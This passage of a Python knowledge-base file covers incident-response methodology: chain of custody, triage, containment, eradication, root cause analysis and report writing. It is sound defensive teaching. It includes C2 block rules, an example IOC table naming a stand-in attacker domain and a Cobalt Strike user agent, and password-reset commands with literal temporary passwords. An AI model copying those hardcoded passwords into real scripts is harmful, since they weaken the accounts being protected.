- **What it contains**: Malware on disk, log files, user files, registry hives, browser history, prefetch files
- **Collection method**: Full disk image with write blocker or forensic imaging tool
```bash
# Linux — dd with hash verification
dc3dd if=/dev/sda of=/evidence/disk.raw hash=sha256 log=/evidence/imaging.log

# Windows — FTK Imager or Arsenal Image Mounter
```

### 6. Remote Logging and Monitoring Data
- **Volatility**: Depends on retention policy
- **What it contains**: SIEM events, EDR telemetry, network captures, flow data, cloud logs
- **Collection method**: Export from SIEM/EDR, request log preservation from cloud providers

### 7. Physical Configuration and Network Topology
- **Volatility**: Rarely changes
- **What it contains**: Cable connections, switch port assignments, VLAN configurations, physical access logs
- **Collection method**: Photograph and document

### 8. Archival Media
- **Volatility**: Least volatile
- **What it contains**: Backups, tape archives, offsite copies
- **Collection method**: Retrieve and preserve as needed

## Practical Field Application

When you arrive at a compromised Windows workstation:

1. **Do NOT power off or reboot** — this destroys memory evidence
2. **Capture memory** (WinPMEM or DumpIt) — 5-15 minutes depending on RAM size
3. **Record network state** (netstat, DNS cache, ARP cache) — 1 minute
4. **Record running processes** (tasklist or Process Explorer) — 1 minute
5. **Collect volatile logs** (Event Log export, Sysmon) — 5 minutes
6. **Image the disk** (if warranted) or collect targeted artefacts (registry hives, prefetch, $MFT)

## Common Mistakes

- **Rebooting to "clean" a compromised system**: Destroys all volatile evidence
- **Running antivirus first**: Modifies file timestamps, deletes malware (evidence), alters memory
- **Imaging disk before memory**: If the system crashes or is rebooted during imaging, memory is lost
- **Using the compromised system's own tools**: Attacker may have trojanised system utilities. Use tools from a trusted USB drive.
- **Not documenting actions**: Every command executed on the compromised system modifies it. Document everything with timestamps.
""",
    },
    {
        "title": "Chain of Custody — Evidence Handling and Documentation",
        "tags": ["chain-of-custody", "evidence", "legal", "documentation", "forensics", "admissibility"],
        "content": r"""# Chain of Custody — Evidence Handling and Documentation

## Overview

Chain of custody (CoC) is the documented, unbroken trail that records the seizure, custody, control, transfer, analysis, and disposition of digital evidence. It proves that evidence has not been tampered with between collection and presentation. Without proper chain of custody, even the most compelling forensic evidence may be deemed inadmissible in legal proceedings or challenged in internal disciplinary actions. Every IR team member must understand and rigorously follow CoC procedures.

## Why Chain of Custody Matters

### Legal Proceedings
Courts require proof that evidence is authentic and has not been altered. The chain of custody establishes:
- **Authenticity**: The evidence is what it purports to be
- **Integrity**: The evidence has not been modified since collection
- **Continuity**: Every person who handled the evidence is documented

### Internal Investigations
Even when legal proceedings are not anticipated, proper CoC:
- Protects the organisation against claims of evidence fabrication
- Ensures HR and compliance teams can rely on findings
- Maintains analyst credibility and professional standards

## Chain of Custody Documentation

### Evidence Intake Form

Every piece of evidence receives a unique identifier and intake form:

| Field | Example |
|---|---|
| Case Number | IR-2026-0315-001 |
| Evidence ID | E-001 |
| Description | Dell Latitude 7430, S/N: ABC123DEF, 16GB RAM, 512GB SSD |
| Date/Time Collected | 2026-03-15 09:30 UTC |
| Collected By | Sarah Chen, SOC Analyst |
| Location Found | Building A, Room 304, Desk 12 |
| Collection Method | FTK Imager — full disk image over USB write blocker |
| Hash (Original) | SHA-256: a1b2c3d4... |
| Condition | Powered on, logged in, locked screen |
| Photographs | Photos 001-005 (see attached) |

### Transfer Log

Every time evidence changes hands:

| Date/Time | Released By | Received By | Purpose | Hash Verified | Signature |
|---|---|---|---|---|---|
| 2026-03-15 10:00 | S. Chen | M. Torres | Transport to forensic lab | Yes - match | [signed] |
| 2026-03-15 14:30 | M. Torres | Forensic Lab | Analysis | Yes - match | [signed] |
| 2026-03-18 09:00 | Forensic Lab | S. Chen | Return after analysis | Yes - match | [signed] |

### Storage Requirements

- **Physical evidence** (hard drives, laptops, phones): Locked evidence room or safe with restricted access and access log
- **Digital evidence** (disk images, memory dumps, PCAPs): Write-protected storage with access controls and audit logging
- **Encryption**: Evidence at rest should be encrypted (BitLocker, LUKS, VeraCrypt) to prevent unauthorised access
- **Redundancy**: Maintain at least two copies of digital evidence in separate locations

## Hash Verification

Cryptographic hashes are the cornerstone of digital evidence integrity:

```bash
# At collection time
sha256sum disk_image.E01 > disk_image.E01.sha256

# Before every analysis session
sha256sum -c disk_image.E01.sha256
# Output: disk_image.E01: OK

# After analysis (should still match original)
sha256sum disk_image.E01
# Compare with original hash
```

**Use SHA-256 as the primary algorithm.** MD5 is considered cryptographically weak but is still commonly recorded as a secondary hash for backward compatibility and cross-referencing with older databases.

**Critical rule**: Always work on a forensic copy, never the original. Verify the copy's hash matches before beginning analysis.

## Best Practices

1. **Document everything in real time** — do not rely on memory to reconstruct the chain later.
2. **Photograph evidence** before touching it — screen contents, cable connections, physical condition.
3. **Minimise the number of handlers** — fewer transfers mean fewer potential points of compromise.
4. **Use write blockers** for all disk access — hardware write blockers are preferred over software.
5. **Seal physical evidence** in tamper-evident bags when transporting.
6. **Maintain a chain of custody log per evidence item** — not per case.
7. **Include timestamps with timezone** for all entries.
8. **Get signatures** (physical or digital) for every transfer.

## When Things Go Wrong

If a hash does not match or the chain is broken:
- **Document the discrepancy immediately** — do not attempt to fix or hide it.
- **Determine the cause** — was the file accidentally modified, or was there intentional tampering?
- **Assess impact** — can the evidence still be used (e.g., if the modification was a known analysis artefact)?
- **Consult legal counsel** — let them determine admissibility.
- **Preserve the modified copy** as a separate evidence item and document the relationship.
""",
    },
    {
        "title": "Triage Methodology — Rapid Incident Assessment",
        "tags": ["triage", "incident-response", "methodology", "assessment", "severity", "scope"],
        "content": r"""# Triage Methodology — Rapid Incident Assessment

## Overview

Triage is the critical decision-making process that occurs in the first minutes to hours of an incident. Its purpose is to rapidly assess the situation, determine severity, identify scope, and make containment decisions — all while preserving evidence. Effective triage distinguishes experienced IR teams from those that waste time on low-priority issues while critical threats escalate. This article presents a structured triage methodology applicable to any incident type.

## The Triage Decision Framework

### Step 1: Initial Assessment (First 15 Minutes)

Answer five questions immediately:

1. **What happened?** — Describe the event in one sentence (e.g., "EDR detected Cobalt Strike beacon on WORKSTATION-42").
2. **When did it start?** — First known indicator timestamp.
3. **What is affected?** — Initial list of systems, accounts, and data.
4. **Is it still active?** — Is the attacker currently operating? Is data currently being exfiltrated?
5. **What is the business impact?** — Revenue, operations, data sensitivity, regulatory obligations.

### Step 2: Severity Classification

| Severity | Criteria | Examples |
|---|---|---|
| P1 — Critical | Active compromise with ongoing damage, critical systems affected, data exfiltration in progress | Ransomware spreading, active APT with domain admin, PII exfiltration |
| P2 — High | Confirmed compromise, significant risk, but not actively spreading | Single server with backdoor, compromised admin account (disabled), phishing with credential harvest |
| P3 — Medium | Suspicious activity requiring investigation, limited confirmed impact | Unusual outbound traffic, single endpoint malware (contained), policy violation |
| P4 — Low | Minor event, low risk, no confirmed compromise | Failed brute-force (account locked), adware detection, vulnerability scan |

### Step 3: Scope Assessment

Determine the blast radius by investigating three dimensions:

**Host scope:**
```
- How many endpoints are affected?
- Are any servers compromised?
- Are domain controllers involved?
- What is the network segment?
```

**Account scope:**
```
- Which accounts are compromised?
- What privileges do they have?
- Are service accounts involved?
- Has password reuse expanded the scope?
```

**Data scope:**
```
- What data was accessible from compromised systems/accounts?
- Was data actually accessed (log evidence)?
- Was data exfiltrated (network evidence)?
- What classification level (public, internal, confidential, restricted)?
```

### Step 4: Rapid Evidence Collection

During triage, collect enough data to confirm or deny the incident. Do not attempt a complete forensic acquisition yet.

**Remote triage collection (5-10 minutes per host):**

```powershell
# Windows — Quick triage script
# Running processes with command lines
Get-CimInstance Win32_Process | Select ProcessId, Name, CommandLine, ParentProcessId | Export-Csv procs.csv

# Network connections
Get-NetTCPConnection | Where-Object {$_.State -eq 'Established'} | Export-Csv connections.csv

# Scheduled tasks
Get-ScheduledTask | Where-Object {$_.State -eq 'Ready'} | Export-Csv tasks.csv

# Recent file modifications in user temp and startup
Get-ChildItem -Path "$env:TEMP","$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup" -Recurse -Force | Sort LastWriteTime -Descending | Select -First 50 | Export-Csv recent_files.csv

# Autoruns (if Sysinternals available)
autorunsc64.exe -accepteula -a * -c > autoruns.csv
```

### Step 5: Containment Decision

Based on triage findings, decide:

| Decision | When | Action |
|---|---|---|
| **Immediate containment** | P1 — active threat, spreading | Network isolate, disable accounts, block IPs |
| **Monitored containment** | P2 — confirmed but stable | Increase monitoring, prepare for containment, collect more evidence |
| **Investigate further** | P3 — suspicious but unconfirmed | Gather additional evidence before making containment decisions |
| **Close/monitor** | P4 — low risk | Document, add detection rule, close or schedule review |

## Communication During Triage

- **Internal escalation**: Notify IR lead, management, and relevant system owners within 30 minutes for P1/P2.
- **Status updates**: Provide a brief update every 30 minutes during P1, every 2 hours during P2.
- **Do not speculate**: Share confirmed facts only. Use phrases like "we have confirmed" vs "we believe."
- **Secure communication**: If the attacker may have email access, use out-of-band communication (phone, Signal, separate Slack workspace).

## Triage Pitfalls

- **Tunnel vision**: Focusing on the first finding without considering that it might be a distraction or one of many compromised hosts.
- **Premature containment**: Blocking an IP before collecting network evidence from the firewall — you lose visibility into what else communicated with that IP.
- **Delayed containment**: Spending too long investigating while the attacker continues to operate.
- **Scope underestimation**: Assuming a single compromised workstation is the full scope without checking for lateral movement.
""",
    },
    {
        "title": "Containment Strategies — Network, Host, and Account Isolation",
        "tags": ["containment", "isolation", "incident-response", "network", "firewall", "EDR"],
        "content": r"""# Containment Strategies — Network, Host, and Account Isolation

## Overview

Containment is the phase of incident response where you stop the bleeding — preventing the attacker from expanding their foothold, exfiltrating more data, or causing additional damage. The challenge is balancing speed (contain before things get worse) with evidence preservation (do not destroy data needed for investigation) and business continuity (minimise operational disruption). This article covers the three primary containment vectors: network, host, and account isolation.

## Containment Principles

1. **Contain the minimum necessary** — over-containment causes unnecessary business disruption and may alert the attacker.
2. **Preserve evidence before containment** — capture memory and network state before isolating a host.
3. **Document every action** — record what was contained, when, by whom, and why.
4. **Coordinate timing** — if containing multiple systems, do it simultaneously to prevent the attacker from pivoting.
5. **Have a rollback plan** — know how to reverse containment actions if they cause unacceptable business impact.

## Network Containment

### Firewall Rules

The fastest way to block attacker C2 infrastructure:

```bash
# Block known C2 IP at the perimeter firewall
# Palo Alto example
set rulebase security rules block-c2-ir2026 from any to any source any destination 203.0.113.50 action deny
set rulebase security rules block-c2-ir2026 log-start yes log-end yes

# iptables (Linux perimeter)
iptables -I FORWARD -d 203.0.113.50 -j DROP -m comment --comment "IR-2026-0315 C2 block"
iptables -I FORWARD -s 203.0.113.50 -j DROP -m comment --comment "IR-2026-0315 C2 block"
```

**Important**: Block both inbound AND outbound to the C2 IP. Also block at DNS level (sinkhole the domain) to catch fallback domains.

### VLAN Isolation

Move compromised hosts to a quarantine VLAN that has:
- No internet access
- No access to production networks
- Access only to the forensic analysis network
- Full packet capture enabled

```
# Cisco switch example
interface GigabitEthernet0/1
  switchport access vlan 999
  description QUARANTINE-IR-2026-0315
```

### EDR Network Isolation

Modern EDR platforms (CrowdStrike, Microsoft Defender for Endpoint, SentinelOne) can isolate hosts at the endpoint level while maintaining the EDR agent's communication channel:

- **CrowdStrike**: Host → Contain Host (maintains Falcon sensor connectivity)
- **Defender for Endpoint**: Device page → Isolate Device (maintains MDE connectivity)
- **SentinelOne**: Endpoint → Network Quarantine

**Advantage**: The host is isolated from the network but the analyst can still query it remotely through the EDR console.

## Host Containment

### Process Termination

Kill known malicious processes, but only after capturing memory:

```powershell
# Windows — Kill process by name or PID
Stop-Process -Name "beacon" -Force
Stop-Process -Id 4528 -Force

# Verify it is gone
Get-Process -Name "beacon" -ErrorAction SilentlyContinue
```

### Service and Scheduled Task Removal

```powershell
# Disable a malicious service
Set-Service -Name "MaliciousService" -StartupType Disabled
Stop-Service -Name "MaliciousService" -Force

# Disable a malicious scheduled task
Disable-ScheduledTask -TaskName "SystemUpdate" -TaskPath "\Microsoft\Windows\"
```

### Host Firewall

If EDR isolation is not available:

```powershell
# Windows — Block all network except management
New-NetFirewallRule -DisplayName "IR-Quarantine-Block-All" -Direction Outbound -Action Block
New-NetFirewallRule -DisplayName "IR-Quarantine-Allow-Mgmt" -Direction Inbound -RemoteAddress 10.0.0.100 -Action Allow
```

## Account Containment

### Disable Compromised Accounts

```powershell
# Active Directory — Disable user account
Disable-ADAccount -Identity compromised_user

# Reset password (in case attacker has the current one)
Set-ADAccountPassword -Identity compromised_user -Reset -NewPassword (ConvertTo-SecureString "TempP@ss!" -AsPlainText -Force)

# Force logoff all sessions
# (No native cmdlet — use query session + logoff on each host)
```

### Service Account Rotation

If a service account is compromised, simply disabling it may cause service outages. Plan the rotation:

1. Identify all systems using the service account.
2. Generate a new password.
3. Update all systems simultaneously during a maintenance window.
4. Change the password on the AD account.
5. Monitor for authentication failures.

### Kerberos Ticket Invalidation

Disabling an AD account does NOT immediately invalidate existing Kerberos tickets (they remain valid until expiry, typically 10 hours). To force immediate revocation:

```powershell
# Reset the account password twice (invalidates all TGTs)
Set-ADAccountPassword -Identity compromised_user -Reset -NewPassword (ConvertTo-SecureString "Temp1!" -AsPlainText -Force)
Set-ADAccountPassword -Identity compromised_user -Reset -NewPassword (ConvertTo-SecureString "Temp2!" -AsPlainText -Force)

# If the krbtgt account is compromised (Golden Ticket), reset it TWICE
# WARNING: This will temporarily break Kerberos for the entire domain
# Plan carefully and execute during maintenance window
```

## Containment Timing Considerations

| Scenario | Recommended Approach |
|---|---|
| Ransomware actively encrypting | Immediate network isolation — every second counts |
| APT with persistent access | Coordinate simultaneous containment of all identified footholds |
| Single endpoint malware (contained by EDR) | Monitored containment — collect evidence first |
| Compromised cloud account | Disable sessions and rotate credentials immediately |
| Insider threat (data theft) | Preserve evidence, then restrict access — coordinate with legal/HR |
""",
    },
    {
        "title": "Eradication and Recovery — Removing Threats and Restoring Operations",
        "tags": ["eradication", "recovery", "incident-response", "remediation", "rebuild", "monitoring"],
        "content": r"""# Eradication and Recovery — Removing Threats and Restoring Operations

## Overview

After containing an incident, the next phases are eradication (completely removing the attacker's presence) and recovery (restoring systems to normal operations). These phases are tightly coupled — incomplete eradication leads to re-compromise, while rushed recovery introduces risk. This article covers systematic approaches to both phases, with emphasis on thoroughness and verification.

## Eradication

### Principle: Remove ALL Persistence

Attackers rarely rely on a single persistence mechanism. A thorough eradication plan must address every known technique and verify that no unknown mechanisms remain.

### Common Persistence Mechanisms to Check

**Windows:**

| Mechanism | Location | Check Command |
|---|---|---|
| Registry Run keys | `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run` | `reg query` or Autoruns |
| Scheduled Tasks | Task Scheduler | `schtasks /query /fo LIST /v` |
| Services | Service Control Manager | `Get-Service \| Where StartType -ne Disabled` |
| WMI Event Subscriptions | WMI Repository | `Get-WMIObject -Namespace root\Subscription -Class __EventFilter` |
| DLL hijacking | System32, application directories | Compare against known-good hash baseline |
| Startup folder | `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup` | `dir` and review |
| COM objects | `HKLM\SOFTWARE\Classes\CLSID` | Autoruns (COM tab) |
| Group Policy | SYSVOL scripts, GPO preferences | `gpresult /h report.html` |
| Golden Ticket | krbtgt hash compromised | Reset krbtgt password twice |

**Linux:**

| Mechanism | Location | Check Command |
|---|---|---|
| Cron jobs | `/etc/cron*`, `/var/spool/cron/` | `crontab -l -u <user>` for each user |
| Systemd services | `/etc/systemd/system/` | `systemctl list-unit-files --state=enabled` |
| SSH authorized_keys | `~/.ssh/authorized_keys` | Review for each user account |
| Bashrc/profile | `~/.bashrc`, `/etc/profile.d/` | Manual review |
| LD_PRELOAD | `/etc/ld.so.preload` | `cat /etc/ld.so.preload` |
| Kernel modules | `/lib/modules/` | `lsmod` and compare to baseline |
| Web shells | Web root directories | Hash comparison, timestamp analysis |

### Eradication Workflow

1. **Build the eradication plan**: Document every artefact to remove, based on the investigation findings.
2. **Coordinate timing**: If multiple hosts are affected, eradicate simultaneously to prevent the attacker from re-establishing persistence from a non-eradicated host.
3. **Execute removals**: Delete malware, remove persistence entries, patch vulnerabilities.
4. **Verify**: Re-scan with EDR, re-run Autoruns, check for remaining IOCs.
5. **Reset credentials**: All compromised accounts, service accounts, and any accounts that shared passwords.

### When to Rebuild vs Clean

| Factor | Clean (Remove Malware) | Rebuild (Reimage) |
|---|---|---|
| Confidence in scope | High — all artefacts identified | Low — unknown persistence possible |
| Rootkit/bootkit suspected | Never clean | Always rebuild |
| System criticality | Low — can tolerate risk | High — cannot risk re-compromise |
| Time constraints | Faster for simple malware | Faster for heavily compromised systems |
| Compliance requirements | May not satisfy auditors | Preferred by compliance |

**General rule**: If the attacker had admin or root access, rebuild from a known-good image.

## Recovery

### Recovery Phases

**Phase 1: Restore from Known-Good State**
- Rebuild compromised systems from gold images or verified backups.
- Restore data from backups taken BEFORE the compromise date.
- Verify backup integrity before restoring (hash verification, spot-check data).

**Phase 2: Harden Before Reconnecting**
- Apply all security patches.
- Implement additional monitoring (Sysmon, enhanced logging).
- Enforce new credentials across all affected accounts.
- Review and tighten firewall rules.

**Phase 3: Monitored Return to Production**
- Reconnect systems to the network one at a time.
- Enable heightened monitoring for 30 days minimum.
- Watch for: connections to known C2, re-appearance of IOCs, anomalous authentication patterns.

### Recovery Verification Checklist

```
[ ] All compromised hosts rebuilt or verified clean
[ ] All compromised credentials rotated
[ ] Vulnerability that enabled initial access patched
[ ] All persistence mechanisms removed and verified
[ ] EDR agents installed and reporting on all recovered hosts
[ ] Enhanced logging enabled (Sysmon, PowerShell, audit policies)
[ ] Network monitoring active for known IOCs
[ ] Backup integrity verified
[ ] Business owners confirmed system functionality
[ ] 30-day heightened monitoring period initiated
```

## Common Mistakes

- **Eradicating too quickly**: Removing malware before the investigation is complete — you may miss other compromised hosts or persistence mechanisms.
- **Not resetting credentials**: The attacker may have harvested passwords that are still valid.
- **Restoring from compromised backups**: If the attacker was present for weeks, backups from that period contain the malware.
- **Declaring victory too soon**: Monitor for re-compromise for at least 30 days after recovery.
""",
    },
    {
        "title": "Root Cause Analysis — Finding the Origin of Compromise",
        "tags": ["root-cause", "analysis", "forensics", "initial-access", "vulnerability", "incident-response"],
        "content": r"""# Root Cause Analysis — Finding the Origin of Compromise

## Overview

Root cause analysis (RCA) answers the fundamental question: "How did the attacker get in, and why were they able to succeed?" Without identifying the root cause, organisations are destined to be compromised again through the same vector. RCA goes beyond identifying the initial access technique to understanding the systemic failures — process gaps, missing controls, misconfigurations — that allowed the compromise to occur and spread.

## The RCA Framework

### Layer 1: Initial Access Vector

Determine exactly how the attacker first gained access to the environment:

| Vector | Evidence Sources | Key Artefacts |
|---|---|---|
| Phishing email | Email gateway logs, mailbox search | Original email headers, attachment hashes, URL clicks |
| Exploited vulnerability | Firewall logs, IDS/IPS, web server logs | Exploit payload in PCAP/logs, vulnerable software version |
| Credential compromise | Authentication logs, dark web monitoring | First successful logon from anomalous location/IP |
| Supply chain | Software inventory, update logs | Compromised update package hash, deployment timeline |
| Insider threat | DLP logs, access logs, HR records | Data access patterns, exfiltration method |
| Physical access | Badge logs, camera footage | Timestamp of physical entry, USB device logs |

### Layer 2: Contributing Factors

Once the initial vector is identified, determine what allowed it to succeed:

**Technical failures:**
- Missing patches (how long was the vulnerability known and unpatched?)
- Misconfigured controls (MFA not enabled, firewall rule too permissive)
- Inadequate monitoring (no detection rule for the attack technique)
- Insufficient segmentation (attacker moved laterally unchallenged)

**Process failures:**
- Patch management SLA not met
- No vulnerability scanning or results not actioned
- Phishing awareness training ineffective or not conducted
- Change management bypassed (unauthorised system exposed to internet)

**People failures:**
- User clicked phishing link despite training
- Administrator used privileged account for email/browsing
- Incident was detected but triaged incorrectly as false positive
- Alert fatigue led to missed detection

### Layer 3: Propagation Analysis

Trace how the attacker moved from initial access to their final objective:

```
Initial Access → Execution → Privilege Escalation → Lateral Movement →
Collection → Exfiltration (or Impact)
```

For each step, identify:
- What technique was used (map to MITRE ATT&CK)
- What control should have detected or prevented it
- Why that control failed or was absent

## The "5 Whys" Technique

Apply iterative questioning to drill down to the systemic root cause:

```
1. Why was the server compromised?
   → The attacker exploited CVE-2026-1234 on the web application.

2. Why was the server vulnerable to CVE-2026-1234?
   → The patch released 6 weeks ago had not been applied.

3. Why wasn't the patch applied in 6 weeks?
   → The vulnerability scan identified it, but the ticket was assigned low priority.

4. Why was a critical CVE assigned low priority?
   → The severity rating was based on CVSS base score without considering
     that the server is internet-facing (environmental score adjustment not done).

5. Why wasn't the environmental context considered?
   → The vulnerability management process does not incorporate asset
     criticality or exposure in prioritisation.

ROOT CAUSE: Vulnerability prioritisation process lacks environmental context,
leading to delayed patching of internet-facing critical assets.
```

## RCA Investigation Techniques

### Timeline Reconstruction

Build a complete timeline from initial access through detection:

```
Day 0:  Phishing email received (09:00) → User clicked link (09:12) →
        Malware executed (09:12) → C2 beacon established (09:13)
Day 1:  Credential harvested (02:00) → Lateral movement to DC (02:15)
Day 3:  Data staging on file server (23:00)
Day 5:  Data exfiltration via HTTPS (01:00-04:00)
Day 7:  EDR alert triggered by suspicious PowerShell (10:30) →
        SOC triage (11:00) → Incident declared (11:30)
```

**Dwell time**: 7 days from compromise to detection. This metric drives improvements in detection capabilities.

### Artefact Correlation

Cross-reference multiple evidence sources to confirm the root cause:
- Email logs confirm the phishing delivery
- Endpoint telemetry confirms the malware execution
- Network logs confirm the C2 communication
- Authentication logs confirm the lateral movement
- DLP/proxy logs confirm the exfiltration

### Counterfactual Analysis

For each contributing factor, ask: "If this control had been in place, would the outcome have been different?"

- If MFA was enabled → credential theft would not have enabled lateral movement
- If network segmentation was enforced → lateral movement would have been blocked
- If the EDR policy was in block mode → the malware execution would have been prevented

This analysis directly informs the remediation recommendations.

## Deliverables

The RCA should produce:
1. **Root cause statement**: One paragraph describing the technical and systemic cause.
2. **Contributing factor list**: Ranked by impact.
3. **MITRE ATT&CK mapping**: Complete kill chain with technique IDs.
4. **Remediation recommendations**: Specific, actionable, prioritised.
5. **Metrics**: Dwell time, time to detect, time to contain, time to eradicate.
""",
    },
    {
        "title": "Incident Response Report Writing and Post-Incident Review",
        "tags": ["IR-report", "post-incident", "lessons-learned", "documentation", "after-action"],
        "content": r"""# Incident Response Report Writing and Post-Incident Review

## Overview

The incident response report and post-incident review (PIR) are the final deliverables of an engagement, but their impact extends far beyond the immediate incident. A well-written report drives security improvements, satisfies regulatory requirements, supports legal proceedings, justifies security budgets, and serves as a training resource for the team. The PIR ensures that operational lessons are captured and acted upon. This article covers the structure, content, and best practices for both.

## Incident Response Report Structure

### Executive Summary (1 page)

Written for non-technical leadership. Must convey:
- **What happened**: One-paragraph summary (e.g., "A targeted phishing campaign led to the compromise of three systems and exfiltration of customer records over a 7-day period.")
- **Business impact**: Quantified where possible (records affected, downtime hours, financial impact)
- **Current status**: Contained, eradicated, recovered, monitoring
- **Key recommendations**: Top 3 actions that would have prevented or limited the incident

### Incident Timeline

Chronological account of every significant event from initial compromise through recovery:

```
2026-03-08 09:00 UTC — Phishing email received by user J.Smith (email-id: MSG-12345)
2026-03-08 09:12 UTC — User clicked link, downloaded payload (hash: abc123...)
2026-03-08 09:13 UTC — C2 beacon established to 203.0.113.50:443
[...]
2026-03-15 11:30 UTC — Incident declared, IR team mobilised
2026-03-15 12:00 UTC — Compromised hosts network-isolated via EDR
2026-03-17 09:00 UTC — Eradication complete, recovery initiated
2026-03-20 09:00 UTC — All systems returned to production
2026-04-19 — 30-day monitoring period concluded, no re-compromise detected
```

### Technical Analysis

Detailed forensic findings organised by kill chain phase:

1. **Initial Access**: How the attacker got in (technique, vulnerability, evidence)
2. **Execution**: What ran on compromised hosts (malware analysis, process trees)
3. **Persistence**: How the attacker maintained access (registry keys, scheduled tasks, implants)
4. **Privilege Escalation**: How elevated access was obtained
5. **Lateral Movement**: Which systems were accessed and how
6. **Collection and Exfiltration**: What data was targeted and how it was extracted
7. **Impact**: What damage was done (encryption, destruction, data theft)

### Indicators of Compromise (IOCs)

Structured IOC list for threat intel sharing and detection rule creation:

| Type | Value | Context |
|---|---|---|
| IP | 203.0.113.50 | C2 server |
| Domain | update-service.evil.com | C2 domain |
| Hash (SHA-256) | a1b2c3d4... | Malware payload |
| File path | C:\Windows\Temp\svchost.exe | Malware on disk |
| Scheduled task | \Microsoft\Windows\SystemUpdate | Persistence |
| User agent | Mozilla/5.0 CobaltStrike/4.8 | C2 beacon (default) |

### Root Cause Analysis

See the dedicated Root Cause Analysis article for the full methodology. Summarise findings here.

### Recommendations

Prioritised remediation actions:

| Priority | Recommendation | Addresses |
|---|---|---|
| P1 | Enable MFA for all remote access and privileged accounts | Initial access, lateral movement |
| P1 | Deploy EDR in block mode on all endpoints | Execution, persistence |
| P2 | Implement network segmentation between workstations and servers | Lateral movement |
| P2 | Establish 48-hour critical patch SLA for internet-facing assets | Initial access |
| P3 | Conduct quarterly phishing simulations | Initial access |

## Post-Incident Review (PIR)

### Scheduling

Hold the PIR within 1-2 weeks of incident closure, while memories are fresh. Include all participants: IR team, affected system owners, management, IT operations, communications, and legal.

### Agenda

1. **Timeline walkthrough**: Review the incident chronologically as a group.
2. **What went well**: Identify and acknowledge effective actions (detection worked, containment was fast, communication was clear).
3. **What could be improved**: Identify gaps without blame (slow detection, unclear escalation path, missing tool capability).
4. **Action items**: Specific, assigned, time-bound improvements.
5. **Metrics review**: Dwell time, MTTD, MTTC, MTTR — compare against industry benchmarks and internal targets.

### PIR Output — Action Tracker

| Action | Owner | Deadline | Status |
|---|---|---|---|
| Create SIEM rule for the initial access technique | SOC Lead | 2026-04-01 | Open |
| Enable PowerShell Script Block Logging on all endpoints | IT Ops | 2026-04-15 | Open |
| Conduct tabletop exercise for ransomware scenario | IR Lead | 2026-05-01 | Open |
| Update IR playbook with lessons from this incident | Analyst | 2026-04-01 | Open |

### PIR Culture

- **Blameless**: Focus on systems and processes, not individuals.
- **Mandatory attendance**: If people skip PIRs, lessons are lost.
- **Action tracking**: PIR outputs must be tracked to completion; untracked action items are worthless.
- **Share findings**: Distribute a sanitised summary to the broader security and IT teams.

## Report Distribution and Classification

- **Full report** (with IOCs and technical detail): IR team, CISO, legal — marked confidential.
- **Executive summary**: C-suite, board (if required by governance).
- **Sanitised version**: Shared with industry peers via ISACs if appropriate.
- **Regulatory notifications**: As required by GDPR, HIPAA, PCI-DSS, etc. — involve legal counsel.
""",
    },
]

# ============================================================
# COLLECTIONS MANIFEST
# ============================================================

COLLECTIONS = [
    ("Log Analysis & Event Forensics", "Windows Event Log forensics, Sysmon analysis, Linux audit logs, web server log forensics, PowerShell logging, authentication event correlation, and timeline construction from multiple log sources.", LOG_FORENSICS),
    ("Network Forensics", "PCAP preservation and chain of custody, network timeline construction, HTTP session reconstruction, email header analysis, DNS forensics, TLS certificate analysis, Zeek log forensics, and covert channel detection.", NETWORK_FORENSICS),
    ("Incident Response Methodology", "NIST IR lifecycle, order of volatility, chain of custody, triage methodology, containment strategies, eradication and recovery, root cause analysis, and IR report writing with post-incident review.", IR_METHODOLOGY),
]
